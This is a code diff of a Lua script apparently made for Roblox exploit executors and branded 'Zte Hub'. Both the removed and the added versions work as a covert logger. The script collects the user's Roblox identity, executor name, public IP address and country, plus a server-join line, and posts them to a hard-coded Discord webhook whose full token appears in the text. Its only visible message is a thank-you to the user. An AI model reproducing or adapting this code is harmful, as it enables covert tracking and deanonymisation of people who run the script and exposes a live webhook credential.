@@ -1,132 +1,110 @@
-local HttpService        = game:GetService("HttpService")
+local Http       = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local WebhookUrl         = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local executor   = identifyexecutor() or "idk"
 
--- 1) Robust executor detection
-local executorName = "UnknownExecutor"
-if pcall(function() return identifyexecutor() end) then
-    local detected = identifyexecutor()
-    if type(detected) == "string" and #detected > 0 then
-        executorName = detected
-    end
-end
-
--- 2) Fetch public IP + country (or “Unknown” if it fails)
+-- Get IP info from https://api.myip.com/
 local function getIPInfo()
-    local ok, response = pcall(function()
-        return HttpService:GetAsync("https://api.myip.com/")
+    local success, response = pcall(function()
+        return Http:GetAsync("https://api.myip.com/")
     end)
-    if not ok or type(response) ~= "string" then
-        return "Unknown", "Unknown"
+    if success then
+        local data = Http:JSONDecode(response)
+        if data and data.country and data.ip then
+            return data.country, data.ip
+        end
     end
-
-    local success, data = pcall(function()
-        return HttpService:JSONDecode(response)
-    end)
-    if not success or type(data) ~= "table" or not data.country or not data.ip then
-        return "Unknown", "Unknown"
-    end
-
-    return data.country, data.ip
+    return "Unknown", "Unknown"
 end
 
--- 3) Fetch the “true” published game name from MarketplaceService using current game.PlaceId
-local gameName
-local success = pcall(function()
-    gameName = MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset).Name
-end)
-if not success then
-    gameName = "Unknown Game"
+-- Get actual game name using MarketplaceService
+local function getGameName()
+    local placeId = game.PlaceId
+    local success, placeInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(placeId)
+    end)
+    if success and placeInfo and placeInfo.Name then
+        return placeInfo.Name
+    else
+        return "Unknown Game"
+    end
 end
 
--- 4) Build the embed payload
-local function buildWebhookPayload()
+local function sendRequest()
     local player      = game.Players.LocalPlayer
-    local displayName = (player and player.DisplayName) or "Not Available"
-    local userName    = (player and player.Name)        or "UnknownUser"
-    local playerId    = (player and player.UserId)      or 0
+    local displayName = player and player.DisplayName or "Display name not available"
+    local userName    = player and player.Name or "Unknown"
+    local playerId    = player and player.UserId or 0
 
-    local placeId = tostring(game.PlaceId or 0)
-    local jobId   = tostring(game.JobId or "")
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
+                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Insert a zero‐width space (U+200B) right before "(" so Discord won't wrap inside the function name
-    local zeroWidth = "\u200B"
-    local joinScript = 
-        "game:GetService('TeleportService'):TeleportToPlaceInstance" .. zeroWidth ..
-        "(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+    -- Get country and IP from API
+    local country, ip = getIPInfo()
 
-    local country, ipAddr = getIPInfo()
+    -- Get the fixed game name
+    local gameName = getGameName()
 
-    local embeds = {
-        {
-            author = {
-                name = "Zte Hub Server",
+    local payload = {
+        content = "**Thanks for using the script!**",
+        embeds = {
+            {
+                author = {
+                    name = "Zte hub Server"
+                },
+                title = userName .. " | " .. displayName,
+                type  = "rich",
+                color = tonumber(0x00FF00),
+                thumbnail = {
+                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
+                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                },
+                fields = {
+                    {
+                        name   = "Executor:",
+                        value  = executor,
+                        inline = true
+                    },
+                    {
+                        name   = "Country:",
+                        value  = country,
+                        inline = true
+                    },
+                    {
+                        name   = "IP Address:",
+                        value  = ip,
+                        inline = true
+                    },
+                    {
+                        name   = "Game Name:",
+                        value  = gameName,
+                        inline = false
+                    },
+                },
             },
-            title  = userName .. " | " .. displayName,
-            type   = "rich",
-            color  = tonumber(0x00FF00),
-
-            thumbnail = {
-                url = 
-                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
-                  "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
-            },
-
-            fields = {
-                {
-                    name  = "Executor:",
-                    value = tostring(executorName),
-                    inline = false,
-                },
-                {
-                    name  = "Country:",
-                    value = tostring(country),
-                    inline = false,
-                },
-                {
-                    name  = "IP Address:",
-                    value = tostring(ipAddr),
-                    inline = false,
-                },
-                {
-                    name  = "Game Name:",
-                    value = tostring(gameName),
-                    inline = false,
-                },
-            },
-        },
-        {
-            title       = "Join Server Script",
-            description = "```lua\n" .. joinScript .. "\n```",
-            color       = tonumber(0x00FF00),
+            {
+                title       = "Join Server Script",
+                description = "\n```lua\n" .. joinScript .. "\n```\n",
+                color       = tonumber(0x00FF00),
+            }
         }
     }
 
     return {
         Url     = WebhookUrl,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = HttpService:JSONEncode({ content = "**Thanks for using the script!**", embeds = embeds }),
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body    = Http:JSONEncode(payload)
     }
 end
 
--- 5) Send the webhook, preferring syn.request() or falling back
-local function sendWebhook()
-    local requestData = buildWebhookPayload()
-
-    if syn and typeof(syn.request) == "function" then
-        syn.request(requestData)
-        return
-    end
-
-    local fallbackRequester = http_request or request or http.request or HttpPost
-    if typeof(fallbackRequester) == "function" then
-        fallbackRequester(requestData)
-        return
-    end
-
-    warn("No supported HTTP‐request function found! Cannot send webhook.")
+if syn then
+    syn.request(sendRequest())
+else
+    local requestFunction = http_request or request or HttpPost or (syn and syn.request)
+    requestFunction(sendRequest())
 end
-
--- Run it
-sendWebhook()
